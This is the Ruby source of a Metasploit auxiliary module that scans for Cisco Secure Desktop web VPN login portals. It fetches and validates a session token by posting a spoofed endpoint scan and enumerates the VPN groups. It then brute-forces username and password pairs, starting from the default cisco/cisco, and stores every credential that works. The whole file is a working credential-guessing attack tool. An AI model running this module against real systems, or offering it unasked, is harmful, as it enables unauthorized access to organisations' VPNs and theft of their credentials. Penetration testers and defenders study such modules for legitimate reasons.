##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco Secure Deskop Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Cisco Secure Desktop web login portals and
        performs login brute force to identify valid credentials.
      },
      'Author'         =>
        [
          'jnqpblc <jnqpblc[at]gmail.com>', # Revision Author
          'Jonathan Claudius <jclaudius[at]trustwave.com>', # Original PoC Author
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SSL' => true,
          'USERNAME' => 'cisco',
          'PASSWORD' => 'cisco'
        }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('GROUP', [false, "A specific VPN group to use", ''])
      ])
  end

  def run_host(ip)
    unless check_conn?
      vprint_error("Connection failed, Aborting...")
      return false
    end

    unless is_app_secure_desktop?
      vprint_error("Application does not appear to be Cisco Secure Desktop. Module will not continue.")
      return false
    end

    vprint_good("Application appears to be Cisco Secure Desktop. Module will continue.")

    @sdesktop_cookie = get_token_cookie()

    unless is_pwd_login_allowed?
      vprint_error("Application does not appear to allow password logins. Module will not continue.")
      return false
    end

    vprint_good("Application appears to allow password logins. Module will continue.")

    groups = Set.new
    if datastore['GROUP'].empty?
      vprint_status("Attempt to Enumerate VPN Groups...")
      groups = enumerate_vpn_groups

      if groups.empty?
        vprint_error("Unable to enumerate groups")
      else
        vprint_good("Enumerated VPN Groups: #{groups.to_a.join(", ")}")
      end

    else
      groups << datastore['GROUP']
    end
    groups << ""

    vprint_status("Starting login brute force...")
    groups.each do |group|
      each_user_pass do |user, pass|
        do_login(user, pass, group)
      end
    end
  end

  @sdesktop_cookie = nil

  # Verify whether the connection is working or not
  def check_conn?
    begin
      res = send_request_raw('uri' => '/', 'method' => 'GET')
      if res
        vprint_good("Server is responsive...")
        return true
      end
    rescue ::Rex::ConnectionRefused,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionError,
           ::Errno::EPIPE
    end
    false
  end

  def enumerate_vpn_groups
    headers = {
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Cookie' => "webvpnlogin=1; webvpnLang=en; sdesktop=#{@sdesktop_cookie};",
     }

    res = send_request_raw(
            'uri' => '/+CSCOE+/logon.html',
            'method' => 'GET',
            'headers' => headers,
          )

    if res &&
       res.code == 302

      res = send_request_raw(
              'uri' => '/+CSCOE+/logon.html?fcadbadd=1',
              'method' => 'GET',
              'headers' => headers,
            )
    end

    groups = Set.new
    group_name_regex = /onchange="updateLogonForm\(this.value,{(.*):true}\)">/

    if res &&
       match = res.body.match(group_name_regex)

      group_string = match[1]
      groups = group_string.scan(/'([\w\-0-9]+)'/).flatten.to_set
    end

    return groups
  end

  # Verify whether we're working with Cisco Secure Desktop or not
  def is_app_secure_desktop?
    headers = {
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Referer' => "https://#{rhost}:#{rport}/",
      'Cookie' => 'webvpnlogin=1; webvpnLang=en',
     }

    res = send_request_raw(
            'uri' => '/+CSCOE+/logon.html',
            'method' => 'GET',
            'headers' => headers,
          )

    if res &&
       res.code == 302

      res = send_request_raw(
              'uri' => '/CACHE/sdesktop/install/start.htm',
              'method' => 'GET',
              'headers' => headers,
            )
    end

    if res &&
       res.code == 200 &&
       res.body.include?('Cisco Secure Desktop')

      return true
    else
      return false
    end
  end

  # Verify whether we're allowed to use password to login or not
  def is_pwd_login_allowed?
    headers = {
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Cookie' => "webvpnlogin=1; webvpnLang=en; sdesktop=#{@sdesktop_cookie};",
     }

      res = send_request_raw(
              'uri' => '/+CSCOE+/logon.html?fcadbadd=1',
              'method' => 'GET',
              'headers' => headers,
            )

    if res &&
       res.code == 200 &&
       res.body.include?('password_field')

      return true
    else
      return false
    end
  end

  def do_logout(cookie)
    res = send_request_raw(
            'uri' => '/+webvpn+/webvpn_logout.html',
            'method' => 'GET',
            'headers' => {
               'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language' => 'en-US,en;q=0.5',
               'Cookie' => "webvpnlogin=1; webvpnLang=en; sdesktop=#{@sdesktop_cookie};",
              }
          )
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'Cisco Secure Desktop',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def get_token_cookie()
    vprint_status("Requesting a session token...")
    res = send_request_raw(
            'uri' => '/+CSCOE+/sdesktop/token.xml',
            'method' => 'GET',
            'headers' => {
               'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language' => 'en-US,en;q=0.5',
               'Referer' => "https://#{rhost}:#{rport}/CACHE/sdesktop/install/start.htm",
               'Cookie' => 'webvpnlogin=1; webvpnLang=en',
              }
          )

    if res &&
       res.code == 200

      token = res.body.scan(/<token>([A-Z0-9]{24})/).flatten.first

    end

    vprint_status("Verifying the session token...")
    res = send_request_raw(
            'uri' => '/+CSCOE+/sdesktop/scan.xml',
            'method' => 'POST',
            'data' => "endpoint.os.version=Linux;\nendpoint.feature=failure;",
            'ctype' => 'text/plain; charset=UTF-8',
            'headers' => {
               'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language' => 'en-US,en;q=0.5',
               'Referer' => "https://#{rhost}:#{rport}/CACHE/sdesktop/install/start.htm",
               'Cookie' => "webvpnlogin=1; webvpnLang=en; sdesktop=#{token};"
              }
          )

    if res &&
       res.code == 200

      return token
    end
  end

  # Brute-force the login page
  def do_login(user, pass, group)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect} and group:#{group.inspect}")

    begin
      post_params = {
        'tgroup'  => '',
        'next'    => '',
        'tgcookieset' => '',
        'username' => user,
        'password' => pass,
        'Login'   => 'Login'
       }

      post_params['group_list'] = group unless group.empty?

      res = send_request_cgi(
              'uri' => '/+webvpn+/index.html',
              'method' => 'POST',
              'ctype' => 'application/x-www-form-urlencoded',
              'vars_post' => post_params,
              'headers' => {
                 'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Language' => 'en-US,en;q=0.5',
                 'Referer' => "https://#{rhost}:#{rport}/+CSCOE+/logon.html",
                 'Cookie' => "webvpnlogin=1; webvpnLang=en; sdesktop=#{@sdesktop_cookie};"
                }
            )

      if res &&
         res.code == 200 &&
         res.body.include?('SSL VPN Service') &&
         res.body.include?('webvpn_logout')

        print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}")

        do_logout(res.get_cookies)

        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
        report_note(ip: rhost, type: 'cisco.cred.group', data: "User: #{user} / Group: #{group}")
        return :next_user

      else
        vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}")
      end

    rescue ::Rex::ConnectionRefused,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionError,
           ::Errno::EPIPE
      vprint_error("HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end
